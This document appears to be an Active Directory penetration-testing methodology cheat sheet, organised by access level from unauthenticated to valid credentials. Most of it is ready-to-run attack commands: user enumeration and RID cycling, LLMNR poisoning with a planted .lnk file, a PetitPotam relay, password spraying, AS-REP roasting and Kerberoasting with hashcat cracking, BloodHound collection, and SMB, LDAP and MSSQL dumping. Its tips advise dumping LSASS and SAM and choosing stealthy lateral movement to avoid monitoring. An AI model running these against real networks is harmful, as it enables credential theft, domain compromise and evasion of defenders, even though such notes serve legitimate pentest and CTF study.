# Active Directory Methodology

## TIP: When you want to transfer files and scripts within an enterprise network using HTTP, ONLY USE PORTS 80 AND 443 because firewalls deny traffic from other ports by default and activity blends better with legitimate traffic.

## TIP 2: When you find credentials for an account, check if these credentials are reused across multiple machines with various protocols.

        netexec smb IP_RANGE -u USER -p PASSWORD

## TIP 3: If you gain administrator access on any host, EXTRACT EVERYTHING! (LSASS, SAM AND SYSTEM HIVES, ETC)

## TIP 4: When you want to do lateral movement, start with WinRM or PSSession — they’re modern and often enabled by default. Fall back to WMI when stealth is important or WinRM is blocked. Avoid PsExec unless necessary — it’s often monitored or flagged. Use RunAs for local user switching, not lateral movement.


### 1) Unauthenticated

1) User Enumeration

Enumerate possible names you might encounter, then use kerbrute to verify the validity of the users within the AD Domain

        kerbrute userenum -d DOMAIN --dc DC_IP users.txt

Blind user enumeration (No info)

        kerbrute userenum -d DOMAIN --dc DC_IP xato-10million-users.txt

Do the RID Cycling attack to enumerate users

        netexec smb IP -u anonymous -p '' --rid-brute > rid.txt

        cat rid.txt | grep SidTypeUser | awk '{print $6}' | awk -F\ '{print $2}' > users.txt

OR

        net rpc group members 'Domain Users' -W 'DOMAIN' -I IP -U '%'



2) LLMNR poisoning

Use responder to capture Net-NTLMv2 hash, then crack it with hashcat. The scenario could be mentioned somewhere in a CTF setup.

        sudo responder -I eth0

Then upload a .lnk file or similar to the target share/folder that points to our responder IP so that the victim will trigger the file and finally capture his hash.

        hashcat -m 5600 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

3) PetitPotam (Unauth) CVE-2022-26925

If SMB signing is not enabled/enforced, you can conduct relay attacks. PetitPotam is one of them

        python3 PetitPotam.py -d DOMAIN ATTACK_IP TARGET_IP

4) LDAP Enumeration

If LDAP port is open, try to do an unauthenticated LDAP query.

Tools: ldapsearch, windapsearch, netexec, ldapdomaindump

Verify if you can use LDAP

        netexec ldap DC_IP

Use tools like ldapdomaindump or ldapsearch to dump LDAP information

        ldapsearch -x -h DC_IP -s base

        ldapdomaindump HOSTNAME

5) SMB Enumeration

Enumerate SMB shares for gathering information like AD credentials, users, etc

Tools: enum4linux, smbclient, netexec, smbmap

        enum4linux -a -u "" -p "" DC_IP && enum4linux -a -u "guest" -p "" DC_IP (Null session and guest access enumeration)

        smbmap -u "" -p "" -P 445 -H DC_IP && smbmap -u "guest" -p "" -P 445 -H DC_IP

        smbclient-U '%' -L //DC_IP && smbclient -U 'guest%' -L //DC_IP

        netexec smb IP -u '' -p '' (Null session)

        netexec smb IP -u 'a' -p '' (Anonymous logon)

### 2) Valid Username Only

Try to further enumerate the domain, or even conduct some attacks with only a valid username

1) Password Spray

If we managed to find a password, but we do not know which user, we can spray the password on different users we have enumerated until we get a hit

Enumerate Password Policy first

        netexec IP -u 'USER' -p 'PASSWORD' --pass-pol

        enum4linux -u 'USERNAME' -p 'PASSWORD' -P IP

        Get-ADDefaultDomainPasswordPolicy

        Get-ADFineGrainedPasswordPolicy -filter * (Fine Grained Password Policy (FGPP)

        Get-ADUserResultantPasswordPolicy -Identity USER

        ldapsearch-ad.py --server 'DC' -d DOMAIN -u USER -p PASS --type pass-pols

Conduct a password spray attack

        netexec smb DC_IP -u USER.TXT -p PASSWORD.TXT --no-bruteforce (Test user=password)

        netexec smb DC_IP -u USER.TXT -p PASSWORD.TXT (Multiple test)

        sprayhound -U USERS.TXT -d DOMAIN -dc DC_IP


2) ASREPRoasting

Use tools like Impacket-GetNPUsers and Rubeus to do an ASREPRoasting attack

Linux

        impacket-GetNPUsers -no-pass -usersfile unames.txt DOMAIN.LOCAL/

        Impacket-GetNPUsers domain/username -no-pass -dc-ip DC_IP -outputfile asreproastinghashes.txt

        Impacket-GetNPUsers domain/ -usersfile usernames.txt -format hashcat -dc-ip DC_IP -dc-host dc.domain.local -outputfile hashesdomain.txt

Windows

        Rubeus.exe asreproast /format:hashcat

        Get-DomainUser -PreauthNotRequired -Properties SamAccountName (Enumerate ASREPRoastable users. Need a session for that to work.)

Then crack the hash with hashcat 

        hashcat -m 18200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

3) Blind Kerberoasting

Linux

        Impacket-GetUserSPNs -no-preauth "ASREP_USER" -usersfile "USER_LIST.TXT" -dc-host "DC_IP" "DOMAIN"/ (Blind Kerberoasting)

Windows

        Rubeus.exe kerberoast /domain:DOMAIN /dc:DC_IP /nopreauth: ASREP_USER /spns:USERS.TXT (Blind Kerberoasting)

### 3) Valid Credentials (Assumed Breach Scenarios)

## TIP: If NTLM does not work for pass-the-hash scenarios or you dont have any clear-text credentials for lateral movenemt/initial access, use Kerberos ticket to authenticate.

In assumed breach scenarios, we can test various protocols and check for various misconfigurations and vulnerabilities if we have valid credentials on a domain.

1) Automation

Tools: adPEAS, Powerview/Sharpview, pingcastle

2) Bloodhound

Run bloodhound against a target domain controller to query any data via LDAP, then upload the data found to the bloodhound GUI and analyze your findings for privilege escalation and/or lateral movement.

Linux

        dnschef.py --fakeip TARGET_IP --nameserver TARGET_IP

        bloodhound-python -d DOMAIN -u USER -p PASSWORD -d DOMAIN.LOCAL -c all -ns 127.0.0.1

Windows

        SharpHound.exe --CollectionMethods all --Domain DOMAIN 

Then download the bloodhound.zip file generated by the tool to our local machine.

Now, run bloodhound on our machine with the following commands:

        sudo neo4j console start

        bloodhound --no-sandbox

Then login to your instance with your credentials, upload your files either by dragging the zip file, or unzip the file and select the .json files containing the data and you are good to go!

3) Kerberoasting

Enumerate Kerberoastable users

        Get-DomainUser -SPN -Properties SamAccountName, ServicePrincipalName

Get TGS hash

Linux

        impacket-GetUserSPNs DOMAIN.LOCAL\SVC_TGS -request 
        
        Impacket-GetUserSPNs -request -dc-ip DC_IP DOMAIN/USER:PASSWORD

Windows

        Rubeus kerberoast /nowrap

Then, crack the hash with hashcat

        hashcat -m 13100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

4) SMB enumeration

        netexec smb IP -u USER -p PASSWORD --shares

        impacket-smbclient -k DOMAIN.LOCAL/USERNAME:PASSWORD@DC.DOMAIN.LOCAL (Authenticate with kerberos)

User enumeration

        netexec smb IP -u USER -p PASSWORD --users

In Impacket-smbclient shell

        shares (Check shares)

        use SHARE_NAME (Go to a share you have access to)

        get FILE (Download interesting files)

5) LDAP enumeration

Do an LDAP enumeration authenticated this time

         ldapdomaindump HOSTNAME -u "DOMAIN\USER" -p PASSWORD (Authenticated ldap enumeration)

         └─$ ldapsearch -x -H ldap://TARGET_IP -D "USERNAME@DOMAIN.COM" -w "PASSWORD" -b "DC=DOMAIN,DC=COM" "(objectClass=user)" sAMAccountName memberOf       

Dump all enumerated users into a usernames list to use for other attacks


             ldapsearch -x -H ldap://TARGET_IP -D "USERNAME@DOMAIN.COM" -w "PASSWORD" -b "DC=DOMAIN,DC=COM" "(objectClass=user)" sAMAccountName | grep "sAMAccountName:" | cut -d " " -f 2 > usernames.txt

6) MSSQL

        impacket-mssqlclient -k DOMAIN.LOCAL (Kerberos auth example)

   Database commands

           SELECT name FROM sys.databases; (Enumerate all databases within MSSQL instance)

        SELECT TABLE_NAME FROM targetdb.INFORMATION_SCHEMA.TABLES; (Enumerate tables of the target database)

        SELECT * FROM targetdb.dbo.targettable (Dump all the contents of the target table of the target database)

You can use other tools like netexec for mssql exploitation/enumeration

7) DNS Enumeration

        dnstool.py -u 'DOMAIN\USER' -p PASSWORD --record "*" --action query DC_IP (Scan the network for interesting findings)

8) ADCS Enumeration

        certipy find -u USER@DOMAIN -p PASSWORD -dc-ip DC_IP (Enumerate for ADCS vulnerabilities. Go to ADCS exploitation section for further usage)

   
